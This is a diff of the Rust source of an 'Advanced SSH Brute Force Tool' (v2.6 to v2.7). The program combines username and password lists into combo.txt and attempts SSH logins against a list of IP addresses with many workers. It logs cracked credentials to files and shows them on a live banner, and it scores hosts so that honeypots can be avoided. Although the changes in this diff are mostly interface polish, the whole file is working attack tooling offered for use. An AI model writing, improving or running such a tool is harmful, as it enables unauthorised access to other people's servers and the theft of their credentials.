@@ -12,7 +12,7 @@ use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 
-const VERSION: &str = "2.6";
+const VERSION: &str = "2.7";
 const CONCURRENT_PER_WORKER: usize = 1;
 
 // ---------------------------------------------------------------------------
@@ -23,6 +23,8 @@ struct Stats {
     goods: AtomicI64,
     errors: AtomicI64,
     honeypots: AtomicI64,
+    last_success: Mutex<String>,
+    last_honeypot: Mutex<String>,
 }
 
 impl Stats {
@@ -31,6 +33,8 @@ impl Stats {
             goods: AtomicI64::new(0),
             errors: AtomicI64::new(0),
             honeypots: AtomicI64::new(0),
+            last_success: Mutex::new(String::new()),
+            last_honeypot: Mutex::new(String::new()),
         }
     }
 }
@@ -70,28 +74,36 @@ struct HoneypotDetector {
 // ---------------------------------------------------------------------------
 
 fn main() {
+    enable_vt_mode();
+
     let stdin = io::stdin();
     let mut reader = stdin.lock();
 
     create_combo_file(&mut reader);
 
-    print!("Enter the IP list file path: ");
-    io::stdout().flush().ok();
-    let mut ip_file = String::new();
-    reader.read_line(&mut ip_file).ok();
-    let ip_file = ip_file.trim().to_string();
+    let ip_file = loop {
+        let p = prompt(&mut reader, "Enter the IP list file path: ");
+        if file_exists(&p) {
+            break p;
+        }
+        eprintln!("❌ File not found: {}, try again.", p);
+    };
 
-    print!("Enter the timeout value (seconds): ");
-    io::stdout().flush().ok();
-    let mut timeout_str = String::new();
-    reader.read_line(&mut timeout_str).ok();
-    let timeout: u64 = timeout_str.trim().parse().unwrap_or(10);
+    let timeout: u64 = loop {
+        let s = prompt(&mut reader, "Enter the timeout value (seconds): ");
+        match s.parse() {
+            Ok(v) if v > 0 => break v,
+            _ => eprintln!("❌ Invalid number, try again."),
+        }
+    };
 
-    print!("Enter the maximum number of workers: ");
-    io::stdout().flush().ok();
-    let mut workers_str = String::new();
-    reader.read_line(&mut workers_str).ok();
-    let max_workers: usize = workers_str.trim().parse().unwrap_or(10);
+    let max_workers: usize = loop {
+        let s = prompt(&mut reader, "Enter the maximum number of workers: ");
+        match s.parse() {
+            Ok(v) if v > 0 => break v,
+            _ => eprintln!("❌ Invalid number, try again."),
+        }
+    };
 
     let start_time = Instant::now();
 
@@ -118,8 +130,50 @@ fn main() {
 }
 
 // ---------------------------------------------------------------------------
-// File helpers
+// Windows VT mode
 // ---------------------------------------------------------------------------
+
+#[cfg(target_os = "windows")]
+fn enable_vt_mode() {
+    #[link(name = "kernel32")]
+    extern "system" {
+        fn GetStdHandle(n_std_handle: u32) -> *mut std::ffi::c_void;
+        fn GetConsoleMode(h_console_handle: *mut std::ffi::c_void, lp_mode: *mut u32) -> i32;
+        fn SetConsoleMode(h_console_handle: *mut std::ffi::c_void, dw_mode: u32) -> i32;
+    }
+    const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5; // (DWORD)-11
+    const ENABLE_VIRTUAL_TERMINAL_PROCESSING: u32 = 0x0004;
+
+    unsafe {
+        let handle = GetStdHandle(STD_OUTPUT_HANDLE);
+        if handle.is_null() {
+            return;
+        }
+        let mut mode: u32 = 0;
+        if GetConsoleMode(handle, &mut mode) != 0 {
+            let _ = SetConsoleMode(handle, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
+        }
+    }
+}
+
+#[cfg(not(target_os = "windows"))]
+fn enable_vt_mode() {}
+
+// ---------------------------------------------------------------------------
+// File helpers + input helpers
+// ---------------------------------------------------------------------------
+
+fn prompt<R: BufRead>(reader: &mut R, msg: &str) -> String {
+    print!("{}", msg);
+    io::stdout().flush().ok();
+    let mut s = String::new();
+    reader.read_line(&mut s).ok();
+    s.trim().to_string()
+}
+
+fn file_exists(path: &str) -> bool {
+    std::path::Path::new(path).exists()
+}
 
 fn get_items(path: &str) -> Vec<Vec<String>> {
     let file = match File::open(path) {
@@ -140,17 +194,29 @@ fn get_items(path: &str) -> Vec<Vec<String>> {
 }
 
 fn create_combo_file<R: BufRead>(reader: &mut R) {
-    print!("Enter the username list file path: ");
-    io::stdout().flush().ok();
-    let mut username_file = String::new();
-    reader.read_line(&mut username_file).ok();
-    let username_file = username_file.trim().to_string();
+    if file_exists("combo.txt") {
+        let answer = prompt(reader, "combo.txt exists. Reuse it? (y/n): ");
+        if answer.eq_ignore_ascii_case("y") || answer.eq_ignore_ascii_case("yes") {
+            println!("✔️  Using existing combo.txt");
+            return;
+        }
+    }
 
-    print!("Enter the password list file path: ");
-    io::stdout().flush().ok();
-    let mut password_file = String::new();
-    reader.read_line(&mut password_file).ok();
-    let password_file = password_file.trim().to_string();
+    let username_file = loop {
+        let p = prompt(reader, "Enter the username list file path: ");
+        if file_exists(&p) {
+            break p;
+        }
+        eprintln!("❌ File not found: {}, try again.", p);
+    };
+
+    let password_file = loop {
+        let p = prompt(reader, "Enter the password list file path: ");
+        if file_exists(&p) {
+            break p;
+        }
+        eprintln!("❌ File not found: {}, try again.", p);
+    };
 
     let usernames = get_items(&username_file);
     let passwords = get_items(&password_file);
@@ -163,13 +229,17 @@ fn create_combo_file<R: BufRead>(reader: &mut R) {
         }
     };
 
+    let mut count = 0u64;
     for username in &usernames {
         for password in &passwords {
             if !username.is_empty() && !password.is_empty() {
-                let _ = writeln!(file, "{}:{}", username[0], password[0]);
+                if writeln!(file, "{}:{}", username[0], password[0]).is_ok() {
+                    count += 1;
+                }
             }
         }
     }
+    println!("✔️  combo.txt created with {} entries", count);
 }
 
 fn append_to_file(data: &str, path: &str) {
@@ -184,14 +254,8 @@ fn append_to_file(data: &str, path: &str) {
 }
 
 fn clear_screen() {
-    #[cfg(target_os = "windows")]
-    {
-        let _ = Command::new("cmd").args(["/c", "cls"]).status();
-    }
-    #[cfg(not(target_os = "windows"))]
-    {
-        let _ = Command::new("clear").status();
-    }
+    print!("\x1b[2J\x1b[H");
+    io::stdout().flush().ok();
 }
 
 // ---------------------------------------------------------------------------
@@ -562,7 +626,7 @@ fn detect_anomalies(server_info: &ServerInfo) -> i32 {
 }
 
 // ---------------------------------------------------------------------------
-// Logging
+// Logging (file-only, no stdout prints to keep banner stable)
 // ---------------------------------------------------------------------------
 
 fn log_successful_connection(info: &ServerInfo) {
@@ -581,12 +645,10 @@ fn log_successful_connection(info: &ServerInfo) {
         Local::now().format("%Y-%m-%d %H:%M:%S"),
     );
     append_to_file(&detailed, "detailed-results.txt");
-
-    println!("✅ SUCCESS: {}", msg);
 }
 
 // ---------------------------------------------------------------------------
-// Banner
+// Banner (in-place update)
 // ---------------------------------------------------------------------------
 
 fn format_time(seconds: f64) -> String {
@@ -607,6 +669,15 @@ fn banner(
     start_time: Instant,
     stop_flag: Arc<AtomicBool>,
 ) {
+    let mut stdout = io::stdout();
+
+    // Hide cursor during updates
+    let _ = write!(stdout, "\x1b[?25l");
+    let _ = stdout.flush();
+
+    // First clear once, then in-place updates
+    clear_screen();
+
     loop {
         thread::sleep(Duration::from_millis(500));
 
@@ -627,52 +698,79 @@ fn banner(
             0.0
         };
 
-        clear_screen();
+        let last_success = stats
+            .last_success
+            .lock()
+            .map(|s| s.clone())
+            .unwrap_or_default();
+        let last_honeypot = stats
+            .last_honeypot
+            .lock()
+            .map(|s| s.clone())
+            .unwrap_or_default();
 
-        println!("==========================================");
-        println!("🚀 Advanced SSH Brute Force Tool v{} 🚀", VERSION);
-        println!("==========================================");
-        println!("📁 File: {} | ⏱️  Timeout: {}s", ip_file, timeout);
-        println!(
-            "🔗 Max Workers: {} | Per Worker: {}",
-            max_workers, CONCURRENT_PER_WORKER
-        );
-        println!("==========================================");
-        println!("🔍 Checked SSH: {}/{}", total_connections, total_ip_count);
-        println!("⚡ Speed: {:.2} checks/sec", cps);
+        let mut frame = String::with_capacity(1500);
+        frame.push_str("\x1b[H"); // cursor home
 
-        if total_connections < total_ip_count {
-            println!("⏳ Elapsed: {}", format_time(elapsed));
-            println!("⏰ Remaining: {}", format_time(remaining));
-            println!("==========================================");
-        } else {
-            println!("⏳ Total Time: {}", format_time(elapsed));
-            println!("✅ Scan Completed Successfully!");
+        macro_rules! ln {
+            ($($arg:tt)*) => {{
+                frame.push_str(&format!($($arg)*));
+                frame.push_str("\x1b[K\n"); // clear line tail
+            }};
         }
 
-        println!("✅ Successful: {}", goods);
-        println!("❌ Failed: {}", errors);
-        println!("🍯 Honeypots: {}", honeypots);
-        println!("==========================================");
+        ln!("==========================================");
+        ln!("🚀 Advanced SSH Brute Force Tool v{} 🚀", VERSION);
+        ln!("==========================================");
+        ln!("📁 File: {} | ⏱️  Timeout: {}s", ip_file, timeout);
+        ln!("🔗 Max Workers: {} | Per Worker: {}", max_workers, CONCURRENT_PER_WORKER);
+        ln!("==========================================");
+        ln!("🔍 Checked SSH: {}/{}", total_connections, total_ip_count);
+        ln!("⚡ Speed: {:.2} checks/sec", cps);
+
+        if total_connections < total_ip_count {
+            ln!("⏳ Elapsed: {}", format_time(elapsed));
+            ln!("⏰ Remaining: {}", format_time(remaining));
+            ln!("==========================================");
+        } else {
+            ln!("⏳ Total Time: {}", format_time(elapsed));
+            ln!("✅ Scan Completed Successfully!");
+            ln!("==========================================");
+        }
+
+        ln!("✅ Successful: {}", goods);
+        ln!("❌ Failed: {}", errors);
+        ln!("🍯 Honeypots: {}", honeypots);
+        ln!("==========================================");
 
         if total_connections > 0 {
             let succ = goods + honeypots;
             if succ > 0 {
-                println!(
-                    "📊 Success Rate: {:.2}%",
-                    goods as f64 / succ as f64 * 100.0
-                );
-                println!(
-                    "🍯 Honeypot Rate: {:.2}%",
-                    honeypots as f64 / succ as f64 * 100.0
-                );
+                ln!("📊 Success Rate: {:.2}%", goods as f64 / succ as f64 * 100.0);
+                ln!("🍯 Honeypot Rate: {:.2}%", honeypots as f64 / succ as f64 * 100.0);
             }
         }
+
+        if !last_success.is_empty() {
+            ln!("🌟 Last: {}", last_success);
+        }
+        if !last_honeypot.is_empty() {
+            ln!("🎯 Last HP: {}", last_honeypot);
+        }
+
+        frame.push_str("\x1b[J"); // clear from cursor to end-of-screen
+
+        let _ = write!(stdout, "{}", frame);
+        let _ = stdout.flush();
 
         if stop_flag.load(Ordering::Relaxed) || total_connections >= total_ip_count {
             break;
         }
     }
+
+    // Show cursor
+    let _ = write!(stdout, "\x1b[?25h");
+    let _ = stdout.flush();
 }
 
 // ---------------------------------------------------------------------------
@@ -807,13 +905,18 @@ fn process_ssh_task(
         if !already_seen {
             if !info.is_honeypot {
                 stats.goods.fetch_add(1, Ordering::Relaxed);
+                if let Ok(mut slot) = stats.last_success.lock() {
+                    *slot = format!(
+                        "{}:{} @ {}:{}",
+                        info.ip, info.port, info.username, info.password
+                    );
+                }
                 log_successful_connection(&info);
             } else {
                 stats.honeypots.fetch_add(1, Ordering::Relaxed);
-                eprintln!(
-                    "🍯 Honeypot detected: {}:{} (Score: {})",
-                    info.ip, info.port, info.honeypot_score
-                );
+                if let Ok(mut slot) = stats.last_honeypot.lock() {
+                    *slot = format!("{}:{} (score {})", info.ip, info.port, info.honeypot_score);
+                }
                 append_to_file(
                     &format!(
                         "HONEYPOT: {}:{}@{}:{} (Score: {})\n",
